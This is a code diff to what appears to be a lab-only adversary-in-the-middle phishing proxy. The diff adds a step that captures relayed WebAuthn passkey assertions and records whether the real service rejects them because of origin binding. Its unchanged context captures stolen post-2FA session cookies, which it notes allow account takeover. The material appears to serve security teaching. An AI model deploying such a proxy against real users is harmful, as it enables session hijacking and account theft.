@@ -13,7 +13,9 @@ SAFETY (hard guardrail): the upstream target is a SINGLE, fixed lab address and 
 refused unless it is a loopback / private / *.lab host. There is deliberately NO
 way to point this at an arbitrary real site. Lab-only, by construction.
 """
+import base64
 import ipaddress
+import json
 import os
 import socket
 import time
@@ -102,6 +104,28 @@ async def proxy(request: Request, path: str):
         await _send_capture("session_cookie", track,
                             {"cookie_name": SESSION_COOKIE_NAME, "cookie_value": stolen_cookie,
                              "note": "Full post-2FA session token — replay = account takeover"})
+
+    # ---- CAPTURE (passkey lesson): a WebAuthn assertion relayed through the proxy ----
+    # We can grab the bytes, but a passkey is bound to the origin the victim's browser
+    # was on (ours, the phishing origin), so the real service refuses it. Record the
+    # attempt + the target's verdict so the attacker console shows WHY it failed.
+    if path.endswith("login/complete") and request.method == "POST":
+        try:
+            payload = json.loads(body.decode("utf-8", "ignore"))
+            cdj = payload.get("client_data_json", "")
+            bound = None
+            if cdj:
+                bound = json.loads(base64.urlsafe_b64decode(cdj + "=" * (-len(cdj) % 4))).get("origin")
+            accepted = upstream.status_code == 200
+            await _send_capture("webauthn_assertion", track, {
+                "bound_origin": bound,
+                "rp_status": upstream.status_code,
+                "verdict": ("ACCEPTED — replayable (origin binding was NOT enforced!)" if accepted
+                            else "REJECTED — passkey is bound to the phishing origin; the stolen "
+                                 "assertion is useless against the real service"),
+            })
+        except Exception:
+            pass
 
     # ---- build the response back to the victim (stay on the proxy origin) ----
     # Set-Cookie must be forwarded one header per cookie: a plain dict would
